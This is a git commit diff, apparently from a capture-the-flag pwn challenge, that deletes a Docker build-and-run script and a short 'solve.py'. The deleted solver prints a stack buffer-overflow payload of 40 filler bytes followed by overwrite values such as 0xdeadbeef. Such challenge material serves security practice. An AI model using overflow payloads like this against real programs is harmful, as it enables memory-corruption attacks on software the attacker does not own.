ad5c43ac13adb63f13efcdccf15697f4a2752ac7
kyrie <duynguyen45608@gmail.com>
2024-06-01 12:09:52 +0700

    Delete pwn_pyrrhus directory

--- pwn_pyrrhus/build-docker.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-docker rm -f browser
-export DOCKER_BUILDKIT=1
-docker build --tag=browser .
-docker run -p 1337:5000 --restart=on-failure --name=browser browser
--- pwn_pyrrhus/simple-buffer.py
+++
@@ -1,3 +0,0 @@
-# solve.py
-payload = b"A" * 40 + b"\xff\xff\xff\xff" + b"\xef\xbe\xad\xde"
-print(payload.decode('latin1'), end='')
